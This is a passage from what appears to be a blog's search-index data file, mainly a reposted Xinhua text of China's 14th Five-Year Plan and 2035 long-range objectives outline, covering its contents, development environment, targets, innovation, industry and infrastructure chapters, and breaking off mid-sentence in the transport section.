https://leiyiming.com/2017/09/23/reactor/ ↩︎ https://blog.csdn.net/qq_40344790/article/details/129745804 ↩︎ https://www.cnblogs.com/scotth/p/6181583.html ↩︎ https://blog.csdn.net/wuu19/article/details/102976698 ↩︎ https://blog.csdn.net/u010168781/article/details/134562223 ↩︎","tags":""},{"title":"中华人民共和国国民经济和社会发展第十四个五年规划和2035年远景目标纲要","url":"/20240513/zhong-hua-ren-min-gong-he-guo-guo-min-jing-ji-he-she-hui-fa-zhan-di-shi-si-ge-wu-nian-gui-hua-he-2035-nian-yuan-jing-mu-biao-gang-yao/","text":"转载自 新华社.中华人民共和国国民经济和社会发展第十四个五年规划和2035年远景目标纲要.中华人民共和国中央人民政府网.2021-03-13 新华社北京3月12日电 中华人民共和国国民经济和社会发展第十四个五年规划和2035年远景目标纲要 目录 第一篇 开启全面建设社会主义现代化国家新征程 第一章 发展环境 第二章 指导方针 第三章 主要目标 第二篇 坚持创新驱动发展 全面塑造发展新优势 第四章 强化国家战略科技力量 第五章 提升企业技术创新能力 第六章 激发人才创新活力 第七章 完善科技创新体制机制 第三篇 加快发展现代产业体系 巩固壮大实体经济根基 第八章 深入实施制造强国战略 第九章 发展壮大战略性新兴产业 第十章 促进服务业繁荣发展 第十一章 建设现代化基础设施体系 第四篇 形成强大国内市场 构建新发展格局 第十二章 畅通国内大循环 第十三章 促进国内国际双循环 第十四章 加快培育完整内需体系 第五篇 加快数字化发展 建设数字中国 第十五章 打造数字经济新优势 第十六章 加快数字社会建设步伐 第十七章 提高数字政府建设水平 第十八章 营造良好数字生态 第六篇 全面深化改革 构建高水平社会主义市场经济体制 第十九章 激发各类市场主体活力 第二十章 建设高标准市场体系 第二十一章 建立现代财税金融体制 第二十二章 提升政府经济治理能力 第七篇 坚持农业农村优先发展 全面推进乡村振兴 第二十三章 提高农业质量效益和竞争力 第二十四章 实施乡村建设行动 第二十五章 健全城乡融合发展体制机制 第二十六章 实现巩固拓展脱贫攻坚成果同乡村振兴有效衔接 第八篇 完善新型城镇化战略 提升城镇化发展质量 第二十七章 加快农业转移人口市民化 第二十八章 完善城镇化空间布局 第二十九章 全面提升城市品质 第九篇 优化区域经济布局 促进区域协调发展 第三十章 优化国土空间开发保护格局 第三十一章 深入实施区域重大战略 第三十二章 深入实施区域协调发展战略 第三十三章 积极拓展海洋经济发展空间 第十篇 发展社会主义先进文化 提升国家文化软实力 第三十四章 提高社会文明程度 第三十五章 提升公共文化服务水平 第三十六章 健全现代文化产业体系 第十一篇 推动绿色发展 促进人与自然和谐共生 第三十七章 提升生态系统质量和稳定性 第三十八章 持续改善环境质量 第三十九章 加快发展方式绿色转型 第十二篇 实行高水平对外开放 开拓合作共赢新局面 第四十章 建设更高水平开放型经济新体制 第四十一章 推动共建“一带一路”高质量发展 第四十二章 积极参与全球治理体系改革和建设 第十三篇 提升国民素质 促进人的全面发展 第四十三章 建设高质量教育体系 第四十四章 全面推进健康中国建设 第四十五章 实施积极应对人口老龄化国家战略 第十四篇 增进民生福祉 提升共建共治共享水平 第四十六章 健全国家公共服务制度体系 第四十七章 实施就业优先战略 第四十八章 优化收入分配结构 第四十九章 健全多层次社会保障体系 第五十章 保障妇女未成年人和残疾人基本权益 第五十一章 构建基层社会治理新格局 第十五篇 统筹发展和安全 建设更高水平的平安中国 第五十二章 加强国家安全体系和能力建设 第五十三章 强化国家经济安全保障 第五十四章 全面提高公共安全保障能力 第五十五章 维护社会稳定和安全 第十六篇 加快国防和军队现代化 实现富国和强军相统一 第五十六章 提高国防和军队现代化质量效益 第五十七章 促进国防实力和经济实力同步提升 第十七篇 加强社会主义民主法治建设 健全党和国家监督制度 第五十八章 发展社会主义民主 第五十九章 全面推进依法治国 第六十章 完善党和国家监督体系 第十八篇 坚持“一国两制” 推进祖国统一 第六十一章 保持香港、澳门长期繁荣稳定 第六十二章 推进两岸关系和平发展和祖国统一 第十九篇 加强规划实施保障 第六十三章 加强党中央集中统一领导 第六十四章 健全统一规划体系 第六十五章 完善规划实施机制 中华人民共和国国民经济和社会发展第十四个五年（2021－2025年）规划和2035年远景目标纲要，根据《中共中央关于制定国民经济和社会发展第十四个五年规划和二〇三五年远景目标的建议》编制，主要阐明国家战略意图，明确政府工作重点，引导规范市场主体行为，是我国开启全面建设社会主义现代化国家新征程的宏伟蓝图，是全国各族人民共同的行动纲领。 第一篇 开启全面建设社会主义现代化国家新征程 “十四五”时期是我国全面建成小康社会、实现第一个百年奋斗目标之后，乘势而上开启全面建设社会主义现代化国家新征程、向第二个百年奋斗目标进军的第一个五年。 第一章 发展环境 我国进入新发展阶段，发展基础更加坚实，发展条件深刻变化，进一步发展面临新的机遇和挑战。 第一节 决胜全面建成小康社会取得决定性成就 “十三五”时期是全面建成小康社会决胜阶段。面对错综复杂的国际形势、艰巨繁重的国内改革发展稳定任务特别是新冠肺炎疫情严重冲击，以习近平同志为核心的党中央不忘初心、牢记使命，团结带领全党全国各族人民砥砺前行、开拓创新，奋发有为推进党和国家各项事业。全面深化改革取得重大突破，全面依法治国取得重大进展，全面从严治党取得重大成果，国家治理体系和治理能力现代化加快推进，中国共产党领导和我国社会主义制度优势进一步彰显。 经济运行总体平稳，经济结构持续优化，国内生产总值突破100万亿元。创新型国家建设成果丰硕，在载人航天、探月工程、深海工程、超级计算、量子信息、“复兴号”高速列车、大飞机制造等领域取得一批重大科技成果。决战脱贫攻坚取得全面胜利，5575万农村贫困人口实现脱贫，困扰中华民族几千年的绝对贫困问题得到历史性解决，创造了人类减贫史上的奇迹。农业现代化稳步推进，粮食年产量连续稳定在1.3万亿斤以上。1亿农业转移人口和其他常住人口在城镇落户目标顺利实现，区域重大战略扎实推进。污染防治力度加大，主要污染物排放总量减少目标超额完成，资源利用效率显著提升，生态环境明显改善。金融风险处置取得重要阶段性成果。对外开放持续扩大，共建“一带一路”成果丰硕。人民生活水平显著提高，教育公平和质量较大提升，高等教育进入普及化阶段，城镇新增就业超过6000万人，建成世界上规模最大的社会保障体系，基本医疗保险覆盖超过13亿人，基本养老保险覆盖近10亿人，城镇棚户区住房改造开工超过2300万套。新冠肺炎疫情防控取得重大战略成果，应对突发事件能力和水平大幅提高。公共文化服务水平不断提高，文化事业和文化产业繁荣发展。国防和军队建设水平大幅提升，军队组织形态实现重大变革。国家安全全面加强，社会保持和谐稳定。 “十三五”规划目标任务胜利完成，我国经济实力、科技实力、综合国力和人民生活水平跃上新的大台阶，全面建成小康社会取得伟大历史性成就，中华民族伟大复兴向前迈出了新的一大步，社会主义中国以更加雄伟的身姿屹立于世界东方。 第二节 我国发展环境面临深刻复杂变化 当前和今后一个时期，我国发展仍然处于重要战略机遇期，但机遇和挑战都有新的发展变化。当今世界正经历百年未有之大变局，新一轮科技革命和产业变革深入发展，国际力量对比深刻调整，和平与发展仍然是时代主题，人类命运共同体理念深入人心。同时，国际环境日趋复杂，不稳定性不确定性明显增加，新冠肺炎疫情影响广泛深远，世界经济陷入低迷期，经济全球化遭遇逆流，全球能源供需版图深刻变革，国际经济政治格局复杂多变，世界进入动荡变革期，单边主义、保护主义、霸权主义对世界和平与发展构成威胁。 我国已转向高质量发展阶段，制度优势显著，治理效能提升，经济长期向好，物质基础雄厚，人力资源丰富，市场空间广阔，发展韧性强劲，社会大局稳定，继续发展具有多方面优势和条件。同时，我国发展不平衡不充分问题仍然突出，重点领域关键环节改革任务仍然艰巨，创新能力不适应高质量发展要求，农业基础还不稳固，城乡区域发展和收入分配差距较大，生态环保任重道远，民生保障存在短板，社会治理还有弱项。 必须统筹中华民族伟大复兴战略全局和世界百年未有之大变局，深刻认识我国社会主要矛盾变化带来的新特征新要求，深刻认识错综复杂的国际环境带来的新矛盾新挑战，增强机遇意识和风险意识，立足社会主义初级阶段基本国情，保持战略定力，办好自己的事，认识和把握发展规律，发扬斗争精神，增强斗争本领，树立底线思维，准确识变、科学应变、主动求变，善于在危机中育先机、于变局中开新局，抓住机遇，应对挑战，趋利避害，奋勇前进。 第二章 指导方针 “十四五”时期经济社会发展，必须牢牢把握以下指导思想、原则和战略导向。 第一节 指导思想 高举中国特色社会主义伟大旗帜，深入贯彻党的十九大和十九届二中、三中、四中、五中全会精神，坚持以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，全面贯彻党的基本理论、基本路线、基本方略，统筹推进经济建设、政治建设、文化建设、社会建设、生态文明建设的总体布局，协调推进全面建设社会主义现代化国家、全面深化改革、全面依法治国、全面从严治党的战略布局，坚定不移贯彻创新、协调、绿色、开放、共享的新发展理念，坚持稳中求进工作总基调，以推动高质量发展为主题，以深化供给侧结构性改革为主线，以改革创新为根本动力，以满足人民日益增长的美好生活需要为根本目的，统筹发展和安全，加快建设现代化经济体系，加快构建以国内大循环为主体、国内国际双循环相互促进的新发展格局，推进国家治理体系和治理能力现代化，实现经济行稳致远、社会安定和谐，为全面建设社会主义现代化国家开好局、起好步。 第二节 必须遵循的原则 ——坚持党的全面领导。坚持和完善党领导经济社会发展的体制机制，坚持和完善中国特色社会主义制度，不断提高贯彻新发展理念、构建新发展格局能力和水平，为实现高质量发展提供根本保证。 ——坚持以人民为中心。坚持人民主体地位，坚持共同富裕方向，始终做到发展为了人民、发展依靠人民、发展成果由人民共享，维护人民根本利益，激发全体人民积极性、主动性、创造性，促进社会公平，增进民生福祉，不断实现人民对美好生活的向往。 ——坚持新发展理念。把新发展理念完整、准确、全面贯穿发展全过程和各领域，构建新发展格局，切实转变发展方式，推动质量变革、效率变革、动力变革，实现更高质量、更有效率、更加公平、更可持续、更为安全的发展。 ——坚持深化改革开放。坚定不移推进改革，坚定不移扩大开放，加强国家治理体系和治理能力现代化建设，破除制约高质量发展、高品质生活的体制机制障碍，强化有利于提高资源配置效率、有利于调动全社会积极性的重大改革开放举措，持续增强发展动力和活力。 ——坚持系统观念。加强前瞻性思考、全局性谋划、战略性布局、整体性推进，统筹国内国际两个大局，办好发展安全两件大事，坚持全国一盘棋，更好发挥中央、地方和各方面积极性，着力固根基、扬优势、补短板、强弱项，注重防范化解重大风险挑战，实现发展质量、结构、规模、速度、效益、安全相统一。 第三节 战略导向 “十四五”时期推动高质量发展，必须立足新发展阶段、贯彻新发展理念、构建新发展格局。把握新发展阶段是贯彻新发展理念、构建新发展格局的现实依据，贯彻新发展理念为把握新发展阶段、构建新发展格局提供了行动指南，构建新发展格局则是应对新发展阶段机遇和挑战、贯彻新发展理念的战略选择。必须坚持深化供给侧结构性改革，以创新驱动、高质量供给引领和创造新需求，提升供给体系的韧性和对国内需求的适配性。必须建立扩大内需的有效制度，加快培育完整内需体系，加强需求侧管理，建设强大国内市场。必须坚定不移推进改革，破除制约经济循环的制度障碍，推动生产要素循环流转和生产、分配、流通、消费各环节有机衔接。必须坚定不移扩大开放，持续深化要素流动型开放，稳步拓展制度型开放，依托国内经济循环体系形成对全球要素资源的强大引力场。必须强化国内大循环的主导作用，以国际循环提升国内大循环效率和水平，实现国内国际双循环互促共进。 第三章 主要目标 按照全面建设社会主义现代化国家的战略安排，2035年远景目标和“十四五”时期经济社会发展主要目标如下。 第一节 2035年远景目标 展望2035年，我国将基本实现社会主义现代化。经济实力、科技实力、综合国力将大幅跃升，经济总量和城乡居民人均收入将再迈上新的大台阶，关键核心技术实现重大突破，进入创新型国家前列。基本实现新型工业化、信息化、城镇化、农业现代化，建成现代化经济体系。基本实现国家治理体系和治理能力现代化，人民平等参与、平等发展权利得到充分保障，基本建成法治国家、法治政府、法治社会。建成文化强国、教育强国、人才强国、体育强国、健康中国，国民素质和社会文明程度达到新高度，国家文化软实力显著增强。广泛形成绿色生产生活方式，碳排放达峰后稳中有降，生态环境根本好转，美丽中国建设目标基本实现。形成对外开放新格局，参与国际经济合作和竞争新优势明显增强。人均国内生产总值达到中等发达国家水平，中等收入群体显著扩大，基本公共服务实现均等化，城乡区域发展差距和居民生活水平差距显著缩小。平安中国建设达到更高水平，基本实现国防和军队现代化。人民生活更加美好，人的全面发展、全体人民共同富裕取得更为明显的实质性进展。 第二节 “十四五”时期经济社会发展主要目标 ——经济发展取得新成效。发展是解决我国一切问题的基础和关键，发展必须坚持新发展理念，在质量效益明显提升的基础上实现经济持续健康发展，增长潜力充分发挥，国内生产总值年均增长保持在合理区间、各年度视情提出，全员劳动生产率增长高于国内生产总值增长，国内市场更加强大，经济结构更加优化，创新能力显著提升，全社会研发经费投入年均增长7%以上、力争投入强度高于“十三五”时期实际，产业基础高级化、产业链现代化水平明显提高，农业基础更加稳固，城乡区域发展协调性明显增强，常住人口城镇化率提高到65%，现代化经济体系建设取得重大进展。 ——改革开放迈出新步伐。社会主义市场经济体制更加完善，高标准市场体系基本建成，市场主体更加充满活力，产权制度改革和要素市场化配置改革取得重大进展，公平竞争制度更加健全，更高水平开放型经济新体制基本形成。 ——社会文明程度得到新提高。社会主义核心价值观深入人心，人民思想道德素质、科学文化素质和身心健康素质明显提高，公共文化服务体系和文化产业体系更加健全，人民精神文化生活日益丰富，中华文化影响力进一步提升，中华民族凝聚力进一步增强。 ——生态文明建设实现新进步。国土空间开发保护格局得到优化，生产生活方式绿色转型成效显著，能源资源配置更加合理、利用效率大幅提高，单位国内生产总值能源消耗和二氧化碳排放分别降低13.5%、18%，主要污染物排放总量持续减少，森林覆盖率提高到24.1%，生态环境持续改善，生态安全屏障更加牢固，城乡人居环境明显改善。 ——民生福祉达到新水平。实现更加充分更高质量就业，城镇调查失业率控制在5.5%以内，居民人均可支配收入增长与国内生产总值增长基本同步，分配结构明显改善，基本公共服务均等化水平明显提高，全民受教育程度不断提升，劳动年龄人口平均受教育年限提高到11.3年，多层次社会保障体系更加健全，基本养老保险参保率提高到95%，卫生健康体系更加完善，人均预期寿命提高1岁，脱贫攻坚成果巩固拓展，乡村振兴战略全面推进，全体人民共同富裕迈出坚实步伐。 ——国家治理效能得到新提升。社会主义民主法治更加健全，社会公平正义进一步彰显，国家行政体系更加完善，政府作用更好发挥，行政效率和公信力显著提升，社会治理特别是基层治理水平明显提高，防范化解重大风险体制机制不断健全，突发公共事件应急处置能力显著增强，自然灾害防御水平明显提升，发展安全保障更加有力，国防和军队现代化迈出重大步伐。 第二篇 坚持创新驱动发展 全面塑造发展新优势 坚持创新在我国现代化建设全局中的核心地位，把科技自立自强作为国家发展的战略支撑，面向世界科技前沿、面向经济主战场、面向国家重大需求、面向人民生命健康，深入实施科教兴国战略、人才强国战略、创新驱动发展战略，完善国家创新体系，加快建设科技强国。 第四章 强化国家战略科技力量 制定科技强国行动纲要，健全社会主义市场经济条件下新型举国体制，打好关键核心技术攻坚战，提高创新链整体效能。 第一节 整合优化科技资源配置 以国家战略性需求为导向推进创新体系优化组合，加快构建以国家实验室为引领的战略科技力量。聚焦量子信息、光子与微纳电子、网络通信、人工智能、生物医药、现代能源系统等重大创新领域组建一批国家实验室，重组国家重点实验室，形成结构合理、运行高效的实验室体系。优化提升国家工程研究中心、国家技术创新中心等创新基地。推进科研院所、高等院校和企业科研力量优化配置和资源共享。支持发展新型研究型大学、新型研发机构等新型创新主体，推动投入主体多元化、管理制度现代化、运行机制市场化、用人机制灵活化。 第二节 加强原创性引领性科技攻关 在事关国家安全和发展全局的基础核心领域，制定实施战略性科学计划和科学工程。瞄准人工智能、量子信息、集成电路、生命健康、脑科学、生物育种、空天科技、深地深海等前沿领域，实施一批具有前瞻性、战略性的国家重大科技项目。从国家急迫需要和长远需求出发，集中优势资源攻关新发突发传染病和生物安全风险防控、医药和医疗设备、关键元器件零部件和基础材料、油气勘探开发等领域关键核心技术。 第三节 持之以恒加强基础研究 强化应用研究带动，鼓励自由探索，制定实施基础研究十年行动方案，重点布局一批基础学科研究中心。加大基础研究财政投入力度、优化支出结构，对企业投入基础研究实行税收优惠，鼓励社会以捐赠和建立基金等方式多渠道投入，形成持续稳定投入机制，基础研究经费投入占研发经费投入比重提高到8%以上。建立健全符合科学规律的评价体系和激励机制，对基础研究探索实行长周期评价，创造有利于基础研究的良好科研生态。 第四节 建设重大科技创新平台 支持北京、上海、粤港澳大湾区形成国际科技创新中心，建设北京怀柔、上海张江、大湾区、安徽合肥综合性国家科学中心，支持有条件的地方建设区域科技创新中心。强化国家自主创新示范区、高新技术产业开发区、经济技术开发区等创新功能。适度超前布局国家重大科技基础设施，提高共享水平和使用效率。集约化建设自然科技资源库、国家野外科学观测研究站（网）和科学大数据中心。加强高端科研仪器设备研发制造。构建国家科研论文和科技信息高端交流平台。 第五章 提升企业技术创新能力 完善技术创新市场导向机制，强化企业创新主体地位，促进各类创新要素向企业集聚，形成以企业为主体、市场为导向、产学研用深度融合的技术创新体系。 第一节 激励企业加大研发投入 实施更大力度的研发费用加计扣除、高新技术企业税收优惠等普惠性政策。拓展优化首台（套）重大技术装备保险补偿和激励政策，发挥重大工程牵引示范作用，运用政府采购政策支持创新产品和服务。通过完善标准、质量和竞争规制等措施，增强企业创新动力。健全鼓励国有企业研发的考核制度，设立独立核算、免于增值保值考核、容错纠错的研发准备金制度，确保中央国有工业企业研发支出年增长率明显超过全国平均水平。完善激励科技型中小企业创新的税收优惠政策。 第二节 支持产业共性基础技术研发 集中力量整合提升一批关键共性技术平台，支持行业龙头企业联合高等院校、科研院所和行业上下游企业共建国家产业创新中心，承担国家重大科技项目。支持有条件企业联合转制科研院所组建行业研究院，提供公益性共性技术服务。打造新型共性技术平台，解决跨行业跨领域关键共性技术问题。发挥大企业引领支撑作用，支持创新型中小微企业成长为创新重要发源地，推动产业链上中下游、大中小企业融通创新。鼓励有条件地方依托产业集群创办混合所有制产业技术研究院，服务区域关键共性技术研发。 第三节 完善企业创新服务体系 推动国家科研平台、科技报告、科研数据进一步向企业开放，创新科技成果转化机制，鼓励将符合条件的由财政资金支持形成的科技成果许可给中小企业使用。推进创新创业机构改革，建设专业化市场化技术转移机构和技术经理人队伍。完善金融支持创新体系，鼓励金融机构发展知识产权质押融资、科技保险等科技金融产品，开展科技成果转化贷款风险补偿试点。畅通科技型企业国内上市融资渠道，增强科创板“硬科技”特色，提升创业板服务成长型创新创业企业功能，鼓励发展天使投资、创业投资，更好发挥创业投资引导基金和私募股权基金作用。 第六章 激发人才创新活力 贯彻尊重劳动、尊重知识、尊重人才、尊重创造方针，深化人才发展体制机制改革，全方位培养、引进、用好人才，充分发挥人才第一资源的作用。 第一节 培养造就高水平人才队伍 遵循人才成长规律和科研活动规律，培养造就更多国际一流的战略科技人才、科技领军人才和创新团队，培养具有国际竞争力的青年科技人才后备军，注重依托重大科技任务和重大创新基地培养发现人才，支持设立博士后创新岗位。加强创新型、应用型、技能型人才培养，实施知识更新工程、技能提升行动，壮大高水平工程师和高技能人才队伍。加强基础学科拔尖学生培养，建设数理化生等基础学科基地和前沿科学中心。实行更加开放的人才政策，构筑集聚国内外优秀人才的科研创新高地。完善外籍高端人才和专业人才来华工作、科研、交流的停居留政策，完善外国人在华永久居留制度，探索建立技术移民制度。健全薪酬福利、子女教育、社会保障、税收优惠等制度，为海外科学家在华工作提供具有国际竞争力和吸引力的环境。 第二节 激励人才更好发挥作用 完善人才评价和激励机制，健全以创新能力、质量、实效、贡献为导向的科技人才评价体系，构建充分体现知识、技术等创新要素价值的收益分配机制。选好用好领军人才和拔尖人才，赋予更大技术路线决定权和经费使用权。全方位为科研人员松绑，拓展科研管理“绿色通道”。实行以增加知识价值为导向的分配政策，完善科研人员职务发明成果权益分享机制，探索赋予科研人员职务科技成果所有权或长期使用权，提高科研人员收益分享比例。深化院士制度改革。 第三节 优化创新创业创造生态 大力弘扬新时代科学家精神，强化科研诚信建设，健全科技伦理体系。依法保护企业家的财产权和创新收益，发挥企业家在把握创新方向、凝聚人才、筹措资金等方面重要作用。推进创新创业创造向纵深发展，优化双创示范基地建设布局。倡导敬业、精益、专注、宽容失败的创新创业文化，完善试错容错纠错机制。弘扬科学精神和工匠精神，广泛开展科学普及活动，加强青少年科学兴趣引导和培养，形成热爱科学、崇尚创新的社会氛围，提高全民科学素质。 第七章 完善科技创新体制机制 深入推进科技体制改革，完善国家科技治理体系，优化国家科技计划体系和运行机制，推动重点领域项目、基地、人才、资金一体化配置。 第一节 深化科技管理体制改革 加快科技管理职能转变，强化规划政策引导和创新环境营造，减少分钱分物定项目等直接干预。整合财政科研投入体制，重点投向战略性关键性领域，改变部门分割、小而散的状态。改革重大科技项目立项和组织管理方式，给予科研单位和科研人员更多自主权，推行技术总师负责制，实行“揭榜挂帅”、“赛马”等制度，健全奖补结合的资金支持机制。健全科技评价机制，完善自由探索型和任务导向型科技项目分类评价制度，建立非共识科技项目的评价机制，优化科技奖励项目。建立健全科研机构现代院所制度，支持科研事业单位试行更灵活的编制、岗位、薪酬等管理制度。建立健全高等院校、科研机构、企业间创新资源自由有序流动机制。深入推进全面创新改革试验。 第二节 健全知识产权保护运用体制 实施知识产权强国战略，实行严格的知识产权保护制度，完善知识产权相关法律法规，加快新领域新业态知识产权立法。加强知识产权司法保护和行政执法，健全仲裁、调解、公证和维权援助体系，健全知识产权侵权惩罚性赔偿制度，加大损害赔偿力度。优化专利资助奖励政策和考核评价机制，更好保护和激励高价值专利，培育专利密集型产业。改革国有知识产权归属和权益分配机制，扩大科研机构和高等院校知识产权处置自主权。完善无形资产评估制度，形成激励与监管相协调的管理机制。构建知识产权保护运用公共服务平台。 第三节 积极促进科技开放合作 实施更加开放包容、互惠共享的国际科技合作战略，更加主动融入全球创新网络。务实推进全球疫情防控和公共卫生等领域国际科技合作，聚焦气候变化、人类健康等问题加强同各国科研人员联合研发。主动设计和牵头发起国际大科学计划和大科学工程，发挥科学基金独特作用。加大国家科技计划对外开放力度，启动一批重大科技合作项目，研究设立面向全球的科学研究基金，实施科学家交流计划。支持在我国境内设立国际科技组织、外籍科学家在我国科技学术组织任职。 第三篇 加快发展现代产业体系 巩固壮大实体经济根基 坚持把发展经济着力点放在实体经济上，加快推进制造强国、质量强国建设，促进先进制造业和现代服务业深度融合，强化基础设施支撑引领作用，构建实体经济、科技创新、现代金融、人力资源协同发展的现代产业体系。 第八章 深入实施制造强国战略 坚持自主可控、安全高效，推进产业基础高级化、产业链现代化，保持制造业比重基本稳定，增强制造业竞争优势，推动制造业高质量发展。 第一节 加强产业基础能力建设 实施产业基础再造工程，加快补齐基础零部件及元器件、基础软件、基础材料、基础工艺和产业技术基础等瓶颈短板。依托行业龙头企业，加大重要产品和关键核心技术攻关力度，加快工程化产业化突破。实施重大技术装备攻关工程，完善激励和风险补偿机制，推动首台（套）装备、首批次材料、首版次软件示范应用。健全产业基础支撑体系，在重点领域布局一批国家制造业创新中心，完善国家质量基础设施，建设生产应用示范平台和标准计量、认证认可、检验检测、试验验证等产业技术基础公共服务平台，完善技术、工艺等工业基础数据库。 第二节 提升产业链供应链现代化水平 坚持经济性和安全性相结合，补齐短板、锻造长板，分行业做好供应链战略设计和精准施策，形成具有更强创新力、更高附加值、更安全可靠的产业链供应链。推进制造业补链强链，强化资源、技术、装备支撑，加强国际产业安全合作，推动产业链供应链多元化。立足产业规模优势、配套优势和部分领域先发优势，巩固提升高铁、电力装备、新能源、船舶等领域全产业链竞争力，从符合未来产业变革方向的整机产品入手打造战略性全局性产业链。优化区域产业链布局，引导产业链关键环节留在国内，强化中西部和东北地区承接产业转移能力建设。实施应急产品生产能力储备工程，建设区域性应急物资生产保障基地。实施领航企业培育工程，培育一批具有生态主导力和核心竞争力的龙头企业。推动中小企业提升专业化优势，培育专精特新“小巨人”企业和制造业单项冠军企业。加强技术经济安全评估，实施产业竞争力调查和评价工程。 第三节 推动制造业优化升级 深入实施智能制造和绿色制造工程，发展服务型制造新模式，推动制造业高端化智能化绿色化。培育先进制造业集群，推动集成电路、航空航天、船舶与海洋工程装备、机器人、先进轨道交通装备、先进电力装备、工程机械、高端数控机床、医药及医疗设备等产业创新发展。改造提升传统产业，推动石化、钢铁、有色、建材等原材料产业布局优化和结构调整，扩大轻工、纺织等优质产品供给，加快化工、造纸等重点行业企业改造升级，完善绿色制造体系。深入实施增强制造业核心竞争力和技术改造专项，鼓励企业应用先进适用技术、加强设备更新和新产品规模化应用。建设智能制造示范工厂，完善智能制造标准体系。深入实施质量提升行动，推动制造业产品“增品种、提品质、创品牌”。 第四节 实施制造业降本减负行动 强化要素保障和高效服务，巩固拓展减税降费成果，降低企业生产经营成本，提升制造业根植性和竞争力。推动工业用地提容增效，推广新型产业用地模式。扩大制造业中长期贷款、信用贷款规模，增加技改贷款，推动股权投资、债券融资等向制造业倾斜。允许制造业企业全部参与电力市场化交易，规范和降低港口航运、公路铁路运输等物流收费，全面清理规范涉企收费。建立制造业重大项目全周期服务机制和企业家参与涉企政策制定制度，支持建设中小企业信息、技术、进出口和数字化转型综合性服务平台。 第九章 发展壮大战略性新兴产业 着眼于抢占未来产业发展先机，培育先导性和支柱性产业，推动战略性新兴产业融合化、集群化、生态化发展，战略性新兴产业增加值占GDP比重超过17%。 第一节 构筑产业体系新支柱 聚焦新一代信息技术、生物技术、新能源、新材料、高端装备、新能源汽车、绿色环保以及航空航天、海洋装备等战略性新兴产业，加快关键核心技术创新应用，增强要素保障能力，培育壮大产业发展新动能。推动生物技术和信息技术融合创新，加快发展生物医药、生物育种、生物材料、生物能源等产业，做大做强生物经济。深化北斗系统推广应用，推动北斗产业高质量发展。深入推进国家战略性新兴产业集群发展工程，健全产业集群组织管理和专业化推进机制，建设创新和公共服务综合体，构建一批各具特色、优势互补、结构合理的战略性新兴产业增长引擎。鼓励技术创新和企业兼并重组，防止低水平重复建设。发挥产业投资基金引导作用，加大融资担保和风险补偿力度。 第二节 前瞻谋划未来产业 在类脑智能、量子信息、基因技术、未来网络、深海空天开发、氢能与储能等前沿科技和产业变革领域，组织实施未来产业孵化与加速计划，谋划布局一批未来产业。在科教资源优势突出、产业基础雄厚的地区，布局一批国家未来产业技术研究院，加强前沿技术多路径探索、交叉融合和颠覆性技术供给。实施产业跨界融合示范工程，打造未来技术应用场景，加速形成若干未来产业。 第十章 促进服务业繁荣发展 聚焦产业转型升级和居民消费升级需要，扩大服务业有效供给，提高服务效率和服务品质，构建优质高效、结构优化、竞争力强的服务产业新体系。 第一节 推动生产性服务业融合化发展 以服务制造业高质量发展为导向，推动生产性服务业向专业化和价值链高端延伸。聚焦提高产业创新力，加快发展研发设计、工业设计、商务咨询、检验检测认证等服务。聚焦提高要素配置效率，推动供应链金融、信息数据、人力资源等服务创新发展。聚焦增强全产业链优势，提高现代物流、采购分销、生产控制、运营管理、售后服务等发展水平。推动现代服务业与先进制造业、现代农业深度融合，深化业务关联、链条延伸、技术渗透，支持智能制造系统解决方案、流程再造等新型专业化服务机构发展。培育具有国际竞争力的服务企业。 第二节 加快生活性服务业品质化发展 以提升便利度和改善服务体验为导向，推动生活性服务业向高品质和多样化升级。加快发展健康、养老、托育、文化、旅游、体育、物业等服务业，加强公益性、基础性服务业供给，扩大覆盖全生命期的各类服务供给。持续推动家政服务业提质扩容，与智慧社区、养老托育等融合发展。鼓励商贸流通业态与模式创新，推进数字化智能化改造和跨界融合，线上线下全渠道满足消费需求。加快完善养老、家政等服务标准，健全生活性服务业认证认可制度，推动生活性服务业诚信化职业化发展。 第三节 深化服务领域改革开放 扩大服务业对内对外开放，进一步放宽市场准入，全面清理不合理的限制条件，鼓励社会力量扩大多元化多层次服务供给。完善支持服务业发展的政策体系，创新适应服务新业态新模式和产业融合发展需要的土地、财税、金融、价格等政策。健全服务质量标准体系，强化标准贯彻执行和推广。加快制定重点服务领域监管目录、流程和标准，构建高效协同的服务业监管体系。完善服务领域人才职称评定制度，鼓励从业人员参加职业技能培训和鉴定。深入推进服务业综合改革试点和扩大开放。 第十一章 建设现代化基础设施体系 统筹推进传统基础设施和新型基础设施建设，打造系统完备、高效实用、智能绿色、安全可靠的现代化基础设施体系。 第一节 加快建设新型基础设施 围绕强化数字转型、智能升级、融合创新支撑，布局建设信息基础设施、融合基础设施、创新基础设施等新型基础设施。建设高速泛在、天地一体、集成互联、安全高效的信息基础设施，增强数据感知、传输、存储和运算能力。加快5G网络规模化部署，用户普及率提高到56%，推广升级千兆光纤网络。前瞻布局6G网络技术储备。扩容骨干网互联节点，新设一批国际通信出入口，全面推进互联网协议第六版（IPv6）商用部署。实施中西部地区中小城市基础网络完善工程。推动物联网全面发展，打造支持固移融合、宽窄结合的物联接入能力。加快构建全国一体化大数据中心体系，强化算力统筹智能调度，建设若干国家枢纽节点和大数据中心集群，建设E级和10E级超级计算中心。积极稳妥发展工业互联网和车联网。打造全球覆盖、高效运行的通信、导航、遥感空间基础设施体系，建设商业航天发射场。加快交通、能源、市政等传统基础设施数字化改造，加强泛在感知、终端联网、智能调度体系建设。发挥市场主导作用，打通多元化投资渠道，构建新型基础设施标准体系。 第二节 加快建设交通强国 建设现代化综合交通运输体系，推进各种运输方式一体化融合发展，提高网络效应和运营效率。完善综合运输大通道，加强出疆入藏、中西部地区、沿江沿海沿边战略骨干通道建设，有序推进能力紧张通道升级扩容，加强与周边国家互联互通。构建快速网，基本贯通“八纵八横”高速铁路，提升国家高速公路网络质量，加快建设世界级港口群和机场群。完善干线网，加快普速铁路建设和既有铁路电气化改造，优化铁路客货布局，推进普通国省道瓶颈路段贯通升级，推动内河高等级航道扩能升级，稳步建设支线机场、通用机场和货运机场，积极发展通用航空。加强邮政设施建设，实施快递“进村进厂出海”工程。推进城市群都市圈交通一体化，加快城际铁路、市域（郊）铁路建设，构建高速公路环线系统，有序推进城市轨道交通发展。提高交通通达深度，推动区域性铁路建设，加快沿边抵边公路建设，继续推进“四好农村路”建设，完善道路安全设施。构建多层级、一体化综合交通枢纽体系，优化枢纽场站布局、促进集约综合开发，完善集疏运系统，发展旅客联程运输和货物多式联运，推广全程“一站式”、“一单制”服务。推进中欧班列集结中心建设。深入推进铁路企业